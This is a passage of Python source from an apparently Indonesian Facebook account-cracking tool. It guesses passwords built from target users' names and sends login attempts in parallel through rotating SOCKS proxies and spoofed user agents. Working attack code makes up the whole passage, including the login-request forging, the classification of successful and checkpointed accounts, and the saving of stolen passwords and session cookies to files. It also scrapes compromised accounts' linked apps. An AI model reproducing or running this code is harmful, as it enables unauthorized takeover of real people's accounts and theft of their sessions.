    return str(cok()).split('.')[0]
def passwrd():
#	os.system('clear')
	global prog,des
	cetak(nel(f"""hasil OK disimpan ke -> OK/OK.txt
hasil CP disimpan ke -> CP/CP.txt"""))
	
	prog = Progress(SpinnerColumn('smiley'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'),TimeElapsedColumn());des = prog.add_task('',total=len(id))
	with prog:
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				pwv = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
						pwv.append(nmf)
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
						pwv.append(frs+'123456')
				else:
					if len(frs)<3:
						pwv.append(nmf)
					else:
						pwv.append(nmf)
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
						pwv.append(frs+'123456')
				if 'ya' in pwpluss:
					for xpwd in pwnya:
						pwv.append(xpwd)
				else:pass
				if 'mobile' in method:
					pool.submit(crack,idf,pwv)
				elif 'free' in method:
					pool.submit(crackfree,idf,pwv)
				elif 'mbasic' in method:
					pool.submit(crackmbasic,idf,pwv)
				else:
					pool.submit(crackmbasic,idf,pwv)
		print('')
		cetak('╰─ Sucses Cracked %s Ok:%s Cp:%s Akuntod'%((len(id)),ok,cp))
		print('')
		exit()


#-------------[ METHOD VILADATE ]-------------#

def crack(idf,pwv):
	global loop,ok,cp
	bi = random.choice(['\x1b[1;92m','\x1b[1;91m','\x1b[1;93m'])
	pers = loop*100/len(id2)
	fff = '%'
	prog.update(des,description=f'[green]{(ok)}[/][blue]/[yellow]{(cp)} {len(id)}/[deep_white]{(loop)}[/]')
	prog.advance(des)
	ua = ua_memek()
#	ua = ('Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3023249458 t6006063806750198674 athfa3c3975 altpub cvcv=2 smf=0')
#	ua = random.choice(["Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/537.36 (KHTML, like Gecko, GoogleAdSenseInfeed) Chrome/107.0.5304.115 Safari/537.36","Mozilla/5.0 (Macintosh; Intel Mac OS X 1068) AppleWebKit/535.11 (KHTML like Gecko) Chrome/17.0.963.56 Safari/535.11","Mozilla/5.0 (iPhone; U; CPU iPhone OS 433 like Mac OS X; es-es) AppleWebKit/533.17.9 (KHTML like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5","Mozilla/5.0 (Macintosh; U; Intel Mac OS X 1064; en-us) AppleWebKit/533.17.8 (KHTML like Gecko) Version/5.0.1 Safari/533.17.8","Mozilla/5.0 (Macintosh; Intel Mac OS X 1058) AppleWebKit/535.7 (KHTML like Gecko) Chrome/16.0.912.75 Safari/535.7","Mozilla/5.0 (Macintosh; Intel Mac OS X 1073) AppleWebKit/537.22 (KHTML like Gecko) Chrome/25.0.1364.152 Safari/537.22","Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:18.0) Gecko/20100101 Firefox/18.0 AlexaToolbar/amznf-3.0.20121129","Mozilla/5.0 (Macintosh; Intel Mac OS X 1084) AppleWebKit/537.74.9 (KHTML like Gecko) Version/6.1.2 Safari/537.74.9","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"])
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs = {'http': 'socks5://'+nip}
			headerstod = {					
					'Host': 'm.facebook.com',
					'cache-control': 'max-age=0',
					'viewport-width': '980',
					'sec-ch-prefers-color-scheme': 'light',
					'upgrade-insecure-requests': '1',
					'user-agent': ua,
					'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
					'x-requested-with': 'com.microsoft.bing',
					'sec-fetch-site': 'none',
					'sec-fetch-mode': 'navigate',
					'sec-fetch-user': '?1',
					'sec-fetch-dest': 'document',
					'accept-encoding': 'gzip, deflate',
					'accept-language': 'en-US,en;q=0.9,id-ID;q=0.8,id;q=0.7'}
			lur = ses.get(f'https://m.facebook.com/login/device-based/password/?uid={idf}&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D2036793259884297%26cbt%3D1685893050258%26e2e%3D%257B%2522init%2522%253A1685893050259%257D%26ies%3D1%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36b4e73a-5c8d-4ed4-aba5-b1feb9513781%26scope%3Dopenid%252Cpublic_profile%252Cuser_friends%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%2522bd52fa18-c421-4da6-a9c2-899e432e71c6%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522m69t4l0bi4rkc13uleua%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.dts.freefiremax%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dbd52fa18-c421-4da6-a9c2-899e432e71c6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.dts.freefiremax%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%2522bd52fa18-c421-4da6-a9c2-899e432e71c6%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522m69t4l0bi4rkc13uleua%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',headers=headerstod)
			
			datanerek = {"lsd":re.search('name="lsd" value="(.*?)"', str(lur.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(lur.text)).group(1),"uid":idf,"next":"https://m.facebook.com/v12.0/dialog/oauth?cct_prefetching=0&client_id=2036793259884297&cbt=1685893050258&e2e=%7B%22init%22%3A1685893050259%7D&ies=1&sdk=android-12.2.0&sso=chrome_custom_tab&nonce=36b4e73a-5c8d-4ed4-aba5-b1feb9513781&scope=openid%2Cpublic_profile%2Cuser_friends%2Cemail&state=%7B%220_auth_logger_id%22%3A%22bd52fa18-c421-4da6-a9c2-899e432e71c6%22%2C%223_method%22%3A%22custom_tab%22%2C%227_challenge%22%3A%22m69t4l0bi4rkc13uleua%22%7D&default_audience=friends&login_behavior=NATIVE_WITH_FALLBACK&redirect_uri=fbconnect%3A%2F%2Fcct.com.dts.freefiremax&auth_type=rerequest&response_type=id_token%2Ctoken%2Csigned_request%2Cgraph_domain&return_scopes=true&ret=login&fbapp_pres=0&logger_id=bd52fa18-c421-4da6-a9c2-899e432e71c6&tp=unspecified","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in lur.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=360x598'
			headersd = {					
					'Host': 'm.facebook.com',
					'content-length': '1187',
					'cache-control': 'max-age=0',
					'viewport-width': '980',
					'sec-ch-prefers-color-scheme': 'light',
					'upgrade-insecure-requests': '1',
					'origin': 'https://m.facebook.com',
					'content-type': 'application/x-www-form-urlencoded',
					'user-agent': ua,
					'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
					'x-requested-with': 'com.microsoft.bing',
					'sec-fetch-site': 'same-origin',
					'sec-fetch-mode': 'navigate',
					'sec-fetch-user': '?1',
					'sec-fetch-dest': 'document',
					'referer': f'https://m.facebook.com/login/device-based/password/?uid={idf}&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D2036793259884297%26cbt%3D1685893050258%26e2e%3D%257B%2522init%2522%253A1685893050259%257D%26ies%3D1%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36b4e73a-5c8d-4ed4-aba5-b1feb9513781%26scope%3Dopenid%252Cpublic_profile%252Cuser_friends%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%2522bd52fa18-c421-4da6-a9c2-899e432e71c6%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522m69t4l0bi4rkc13uleua%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.dts.freefiremax%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dbd52fa18-c421-4da6-a9c2-899e432e71c6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.dts.freefiremax%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%2522bd52fa18-c421-4da6-a9c2-899e432e71c6%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522m69t4l0bi4rkc13uleua%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',
					'accept-encoding': 'gzip, deflate, br',
					'accept-language': 'en-US,en;q=0.9,id-ID;q=0.8,id;q=0.7'}
			po = ses.post(f"https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID",data=datanerek,cookies={'cookie': koki},headers=headersd,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				tree = Tree(f"[yellow]Year Of Account [red]{tahun(idf)}",guide_style='white')
				tree.add(f"[yellow]{idf}|{pw}[white]").add(f"[yellow]{ua}[white]")
				cetak(tree)
				print("\r")     
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				headapp={"user-agent":"SupportsFresco=1 Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]"}
				if 'no' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					tree = Tree(f"[green]Year Of Account [blue]{tahun(idf)}",guide_style='white')
					tree.add(f"[green]{idf}|{pw}[white]").add(f"[green]{kuki}[white]")
					tree.add(f"[blue]{ua}[white]")
					cetak(tree)
					print("\r")
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					break
				elif 'ya' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					user=idf
					infoakun = ""
					session = requests.Session()
					cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
					cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
					apkaktif=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek))
					nok=1
					for muncul in apkaktif:
						infoakun+= (f"	{x}[{h}{nok}{x}] {b}{muncul[0]} {muncul[1]}{x}\n")
						nok+=1

					hit=0
					apkexp=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek2))
					hit=0
					for muncul in apkexp:
						hit+=1
						infoakun += (f"	{x}[{k}{hit}{x}] {m}{muncul[0]} {muncul[1]}{x}\n")
					tree = Tree(f"[green]Year Of Account [blue]{tahun(idf)}",guide_style='white')
					tree.add(f"[green]{idf}|{pw}[white]").add(f"[green]{kuki}[white]")
					tree.add(f"[blue]{ua}[white]")
					tree.add(f"[green]{infoakun}[white]")
					cetak(tree)
					print("\r")
					ok+=1
					break

			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(1)
	loop+=1
#
def crackmbasic(idf,pwv):
	global loop,ok,cp
	bi = random.choice(['\x1b[1;92m','\x1b[1;91m','\x1b[1;93m'])
	pers = loop*100/len(id2)
	fff = '%'
	prog.update(des,description=f'{bi}CRACK [VALIDATE]{x} [deep_white]{(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
	prog.advance(des)
#	ua = random.choice(tod)
	ua = ua_memek()
#	ua = random.choice(["Mozilla/5.0 (Linux; U; Android 11; zh-CN; MZ-Infinix X657C Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/2.2.010 UWS/ Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 11; zh-CN; MZ-meizu 17 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/73.0.3683.121 MZBrowser/9.9.2 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 11; zh-CN; MZ-TECNO KG6p Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/2.2.020 UWS/ Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 9; zh-CN; MZ-Note9 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/73.0.3683.121 MZBrowser/8.20.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 10; zh-CN; MZ-itel L6503 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/2.2.010 UWS/ Mobile Safari/537.36"])
#	ua = ("Mozilla/5.0 (Linux; Android 10; Infinix X682C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36")
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			lur = ses.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={idf}&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv3.2%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fpixlr.com%252Fauth%252Ffacebook%252Fcallback%26scope%3Demail%26state%3Dhttps%253A%252F%252Fpixlr.com%252Fid%252Fx%252F%26client_id%3D144117062837799%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D22578d62-3b5e-447d-bc4d-865f25438095%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fpixlr.com%2Fauth%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dhttps%253A%252F%252Fpixlr.com%252Fid%252Fx%252F%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			
			datane = {						
						"lsd": re.search('name="lsd" value="(.*?)"', str(lur.text)).group(1),
						"jazoest": re.search('name="jazoest" value="(.*?)"', str(lur.text)).group(1),
						"uid": idf,
						"next": "https://m.facebook.com/v15.0/dialog/oauth?app_id=153040644900826&cbt=1669935554956&channel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df204ee59b7478c%26domain%3Dwww.sololearn.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.sololearn.com%252Ff325bd3ccc72b68%26relation%3Dopener&client_id=153040644900826&display=touch&domain=www.sololearn.com&e2e=%7B%7D&fallback_redirect_uri=https%3A%2F%2Fwww.sololearn.com%2F&locale=en_US&logger_id=f2ea019bb54cfd&origin=2&redirect_uri=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df12a968c543198%26domain%3Dwww.sololearn.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.sololearn.com%252Ff325bd3ccc72b68%26relation%3Dopener%26frame%3Df1aaaf3ac419b3c&response_type=token%2Csigned_request%2Cgraph_domain&scope=public_profile%2Cemail&sdk=joey&version=v15.0&ret=login&fbapp_pres=0&tp=unspecified",
						"flow": "login_no_pin",
						"encpass": "#PWD_BROWSER:5:{}:{}".format(ran(),pw),
						}
			
			hederst = {			
			'Host': 'm.facebook.com',
			'cache-control': 'max-age=0',
			'upgrade-insecure-requests': '1',
			'origin': 'https://m.facebook.com',
			'content-type': 'application/x-www-form-urlencoded',
			'user-agent': ua,
			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
			'x-requested-with': 'com.microsoft.bing',
			'sec-fetch-site': 'same-origin',
			'sec-fetch-mode': 'navigate',
			'sec-fetch-user': '?1',
			'sec-fetch-dest': 'document',
			'referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv15.0%2Fdialog%2Foauth%3Fapp_id%3D153040644900826%26cbt%3D1669935554956%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df204ee59b7478c%2526domain%253Dwww.sololearn.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.sololearn.com%25252Ff325bd3ccc72b68%2526relation%253Dopener%26client_id%3D153040644900826%26display%3Dtouch%26domain%3Dwww.sololearn.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.sololearn.com%252F%26locale%3Den_US%26logger_id%3Df2ea019bb54cfd%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df12a968c543198%2526domain%253Dwww.sololearn.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.sololearn.com%25252Ff325bd3ccc72b68%2526relation%253Dopener%2526frame%253Df1aaaf3ac419b3c%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Dpublic_profile%252Cemail%26sdk%3Djoey%26version%3Dv15.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df12a968c543198%26domain%3Dwww.sololearn.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.sololearn.com%252Ff325bd3ccc72b68%26relation%3Dopener%26frame%3Df1aaaf3ac419b3c%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',
			'accept-encoding': 'gzip, deflate',
			'accept-language': 'en-US,en;q=0.9,id-ID;q=0.8,id;q=0.7'}
			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID', headers=hederst, data=datane, allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
#				oi = nel(f'[yellow]EMAIL[white]|[yellow]PASS   [white]: [yellow]{idf}[white]|[yellow]{pw}\n[yellow]USER AGENT   [white]:[yellow] {ua}', style='yellow',title='[yellow] login from m.facebook.com[/] ')
#				cetak(nel(oi, title='[green]• [yellow]• [red]• [yellow]YOTTA[white]•[yellow]CP[/] [red]• [yellow]• [green]•',subtitle=f'[green]• [yellow]• [red]• [yellow]AKUN[white]•[yellow]{tahun(idf)} [red]• [yellow]• [green]•'))
				
				tree = Tree(f"[yellow]Acc CP [red]{tahun(idf)}",guide_style='white')
				tree.add(f"[yellow]{idf}|{pw}[white]")
				cetak(tree)
				print("\r")
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
#				oi = nel(f'[green]EMAIL[white]|[green]PASS   [white]: [green]{idf}[white]|[green]{pw}\n[green]USER AGENT   [white]:[green] {ua}\nCOOKIES      [white]:[green] {kuki}', style='green',title='[green] login from m.facebook.com[/] ')
#				cetak(nel(oi, title='[green]• [yellow]• [red]• [yellow]YOTTA[white]•[yellow]CP[/] [red]• [yellow]• [green]•',subtitle=f'[green]• [yellow]• [red]• [yellow]AKUN[white]•[green]{tahun(idf)} [red]• [yellow]• [green]•'))
				
				tree = Tree(f"[green]Acc OK [blue]{tahun(idf)}",guide_style='white')
				tree.add(f"[green]{idf}|{pw}[white]").add(f"[green]{kuki}[white]")
				cetak(tree)
				print("\r")
				
				open('OK/'+okc,'a').write(idf+'|'+pw+'\n'+kuki+'\n')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#-----------------------[ SYSTEM-CONTROL ]--------------------#

if __name__=='__main__':
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	try:os.system('clear')
	except:pass
	back()

#KATA HARI INI : KONTOL